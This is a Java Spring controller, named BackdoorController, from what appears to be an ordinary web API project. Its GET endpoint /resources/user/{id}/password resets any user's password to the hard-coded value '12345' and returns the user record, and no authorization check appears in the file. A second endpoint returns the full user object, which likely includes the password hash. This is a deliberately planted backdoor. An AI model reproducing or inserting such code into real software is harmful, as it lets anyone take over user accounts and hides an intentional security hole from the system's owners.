package com.frank.api.controller.auth;

import com.frank.api.config.Config;
import com.frank.api.controller.RestBaseController;
import com.frank.api.model.Brand;
import com.frank.api.model.User;
import com.frank.api.service.BrandService;
import com.frank.api.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.Page;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.validation.Valid;
import java.security.Principal;
import java.util.HashMap;
import java.util.List;
import java.util.Optional;

@CrossOrigin(origins = Config.ORIGINS, maxAge = Config.MAX_AGE)
@RestController
@RequestMapping("/resources")
public class BackdoorController extends RestBaseController {

    @Autowired
    private UserService userService;

    @Autowired
    private BCryptPasswordEncoder bCryptPasswordEncoder;


    @GetMapping("/user/details")
    public HashMap<String, Object> details(HttpServletRequest request) {
        Principal principal = request.getUserPrincipal();
        HashMap<String, Object> response = new HashMap<>();
        try{
            String username = principal.getName();
            response.put("status", "1");
            response.put("user", userService.loadUserByUsername(username));
            return response;
        } catch (UsernameNotFoundException e){
            response.put("status", "0");
            response.put("user", null);
            return response;
        }
    }


    @GetMapping("/user/{id}/password")
    public HashMap<String, Object> password(@PathVariable(value = "id") Long id) {
        String new_passwrod = bCryptPasswordEncoder.encode("12345");
        User user = userService.getUserById(id);
        user.setPassword(new_passwrod);
        User updatedUser = userService.updateUser(user);
        HashMap<String, Object> response = new HashMap<>();
        response.put("status", "1");
        response.put("user", updatedUser);
        return response;
    }

}